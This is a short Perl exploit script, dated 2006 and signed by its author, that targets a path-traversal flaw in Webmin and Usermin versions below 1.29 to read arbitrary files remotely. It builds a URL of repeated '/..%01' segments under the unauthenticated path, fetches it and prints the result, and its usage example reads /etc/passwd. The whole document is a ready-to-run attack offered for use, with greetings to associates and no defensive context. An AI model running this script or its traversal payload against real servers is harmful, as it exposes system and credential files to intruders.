#!/usr/bin/perl
#		Exploit for WEBMIN and USERMIN  less than 1.29x           ARBITARY REMOTE FILE DISCLOSURE
#		Thrusday 13th  July 2006
#		Vulnerability Disclosure at securitydot.net
#		Coded by UmZ! umz32.dll@gmail.com
#		
#
#
#		Make sure you have LWP before using this exploit.
#		USE IT AT YOUR OWN RISK
#
#		GREETS to wiseguy, Anonymous Individual, Uquali......Jhant... Fakhru... etc........................
#		for other.. like AHMED n FAIZ ... (GET A LIFE MAN).


use LWP::Simple;

if (@ARGV < 3) { 
                    print("Usage: $0 <url> <port> <filename>\n"); 
                    print("Define full path with file name \n");
		    print("Example: ./webmin.pl blah.com 10000 /etc/passwd\n");
		    exit(1); 
                    } 

                    ($target, $port,$filename) = @ARGV;

		print("WEBMIN EXPLOIT !!!!! coded by UmZ!\n");
		print("Comments and Suggestions are welcome at umz32.dll [at] gmail.com\n");
		print("Vulnerability disclose at securitydot.net\nI am just coding it in perl 'cuz I hate PHP!\n");
		print("Attacking $target on port $port!\n");
		print("FILENAME:  $filename\n");
		

		$temp="/..%01" x 40;
		
my $url= "http://". $target. ":" . $port ."/unauthenticated/".$temp . $filename;

$content=get $url;
print("\n FILE CONTENT STARTED");
print("\n -----------------------------------\n");

print("$content");
print("\n -------------------------------------\n");

